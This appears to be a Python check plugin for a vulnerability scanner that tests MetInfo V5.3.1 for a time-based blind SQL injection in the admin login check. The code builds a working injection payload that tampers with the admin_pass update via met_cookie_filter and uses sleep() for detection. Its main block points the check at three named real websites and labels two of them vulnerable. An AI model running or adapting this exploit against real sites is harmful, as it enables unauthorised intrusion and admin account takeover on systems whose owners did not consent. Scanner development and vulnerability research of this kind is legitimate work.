#!/usr/bin/env
#*_* coding: utf-8 *_*

#name: MetInfo V5.3.1 sql注入(管理员密码重置)
#author: yichin
#refer: https://beehive.nsfocus.com/bbforum/topic/308/

def assign(service, arg):
    if service == 'metinfo':
        return True,arg

def audit(arg):
    admin_url = arg + 'admin/'
    start_time = time.time()
    code, head, res, errcode, _ = curl.curl2(admin_url)
    normal_time = time.time()-start_time   #正常访问链接的时间
    if code == 404:
        return False
    delay_time = normal_time + 3          #盲注延时时间
    payload = arg + 'admin/login/login_check.php?met_cookie_filter[a]=a%27,admin_pass=admin_pass+where+id=1+and+233=if(1=1,sleep('+str(delay_time)+'),233);+%23–'
    #print delay_time;
    start_time = time.time()
    code, head, res, errcode, _ = curl.curl2(payload)
    payload_time = time.time() - start_time
    if code == 404:
        return False
    if(payload_time > (normal_time + 2)):       #time函数有一定误差，因此用大于正常时间2s检测是否有注入
        security_hole(arg + ' sql injection vulnerable')
if __name__ == '__main__':
    from dummy import *
    import time
    audit(assign('metinfo', 'http://www.qianbi88.com/')[1]) #存在漏洞
    audit(assign('metinfo', 'http://www.yi-hangic.com/')[1])#存在漏洞
    audit(assign('metinfo', 'http://www.metinfo.cn/')[1]) #官网已修复